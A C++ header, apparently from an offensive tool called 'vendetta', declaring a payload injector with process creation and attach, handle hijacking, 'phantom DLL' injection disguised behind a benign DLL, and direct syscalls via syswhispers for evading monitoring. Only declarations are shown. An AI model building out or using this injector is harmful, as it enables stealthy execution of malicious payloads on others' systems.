#pragma once
#include <fstream>
#include <print>
#include <vector>
#include "syswhispers.h"
#include <TlHelp32.h>
#include <sstream>


namespace vendetta
{
	struct Pattern
	{
		std::string signature;
		std::string name;
		std::vector<int> bytes;

		explicit Pattern(const std::string& sig, std::string name = "") : signature(sig),
			name(std::move(name)), bytes(ParsePattern(sig))
		{
		}

		static std::vector<int> ParsePattern(const std::string& pattern)
		{
			std::vector<int> result;
			std::istringstream iss(pattern);
			std::string token;

			while (iss >> token)
			{
				if (token == "?")
				{
					result.push_back(-1);
					continue;
				}
				result.push_back(std::stoi(token, nullptr, 16));
			}

			return result;
		}
	};

	bool inject_phantom_dll(const PROCESS_INFORMATION& pi, const BYTE* buf, SIZE_T buf_size, const std::wstring& legitimate_dll_path);
	HANDLE hijack_process_handle(const DWORD target_pid);

	class injector
	{
		STARTUPINFOA si_{};
		PROCESS_INFORMATION pi_{};
		BYTE* buf_;
		SIZE_T buf_size_;
		std::vector<BYTE> payload_loaded_;

		static std::vector<BYTE> load_payload_from_file(const std::string& file);

	public:
		template <SIZE_T N>
		explicit injector(BYTE(&data)[N])
			: buf_(data), buf_size_(N)
		{
		}
		explicit injector(const std::string& file)
		{
			payload_loaded_ = load_payload_from_file(file);

			if (payload_loaded_.empty())
			{
				buf_ = nullptr;
				buf_size_ = 0;
				std::println("[-] Failed to load payload from file: {}", file);
			}
			else
			{
				buf_ = payload_loaded_.data();
				buf_size_ = payload_loaded_.size();
			}
		}

		~injector();

		enum retrieve_handle_method : uint8_t
		{
			open_handle,
			hijack_handle
		};

		bool create_process(const LPCSTR& benign_dll, bool create_suspended = false);
		bool attach_to_process(DWORD pid, retrieve_handle_method handle_method = hijack_handle);
		bool attach_to_process_by_name(const std::wstring& process_name, retrieve_handle_method handle_method = hijack_handle);
		[[nodiscard]] bool inject(const std::wstring& benign_dll) const;
	};
}